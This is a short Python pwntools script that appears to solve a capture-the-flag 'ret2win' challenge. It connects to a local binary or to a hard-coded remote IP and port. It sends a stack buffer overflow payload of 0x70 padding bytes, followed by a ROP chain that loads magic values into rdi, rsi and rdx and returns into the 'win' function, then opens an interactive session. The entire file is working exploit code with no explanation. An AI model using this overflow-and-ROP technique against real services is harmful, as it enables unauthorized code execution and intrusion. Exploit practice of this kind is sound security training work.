#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 19001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

pop_rdi = 0x0040121e
pop_rsi = 0x00401220
pop_rdx = 0x00401222
ret = pop_rdi + 1
payload = b"A" * 0x70
payload += flat(
    elf.bss(0xc00),
    pop_rdi, 0xdeadbeefdeadbeef,
    pop_rsi, 0xabcd1234dcba4321,
    pop_rdx, 0x147147147147147,
    ret,
    elf.sym['win'],
)
io.sendline(payload)

io.interactive()
